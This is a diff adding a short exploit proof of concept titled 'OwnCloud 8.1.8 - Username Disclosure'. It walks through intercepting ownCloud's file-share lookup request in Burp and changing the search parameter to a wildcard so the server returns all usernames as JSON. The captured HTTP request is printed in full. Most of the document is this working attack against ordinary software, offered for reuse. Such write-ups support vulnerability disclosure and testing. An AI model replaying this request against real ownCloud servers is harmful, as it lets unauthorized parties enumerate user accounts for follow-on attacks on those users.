@@ -1,0 +1,40 @@
+# Exploit Title: OwnCloud 8.1.8 - Username Disclosure
+# Exploit Author : Daniel Moreno
+# Exploit Date: 2019-11-29
+# Vendor Homepage :  https://owncloud.org/  
+# Link Software :  https://ftp.icm.edu.pl/packages/owncloud/  (old version. Download at your own risk) 
+# Tested on OS: CentOS
+
+# PoC:
+# 1. Create an account in OwnCloud
+# 2. Intercept connection with Burp
+# 3. Share a file, typing anything
+
+---------------------------------------------------------
+4. Burp will capture this request
+
+GET /index.php/core/ajax/share.php?fetch=getShareWith&*search=bla*&limit=200&itemType=file
+HTTP/1.1
+Host: XXXXXXXXXXXXX
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0)
+Gecko/20100101 Firefox/70.0
+Accept: */*
+Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+requesttoken: XXXXXXXXXXXXXXXXXXX
+OCS-APIREQUEST: true
+X-Requested-With: XMLHttpRequest
+Connection: close
+Referer: https://domain.com/index.php/apps/files/
+Cookie: XXXXXXXXXXXXXXXX
+---------------------------------------------------------------------
+
+5. Send to Repeater
+
+6. Change GET parameter to THIS:
+
+GET /index.php/core/ajax/share.php?fetch=getShareWith&*search=*&limit=200&itemType=file
+HTTP/1.1
+
+
+7. Return valeus will be a JSON with all username informations
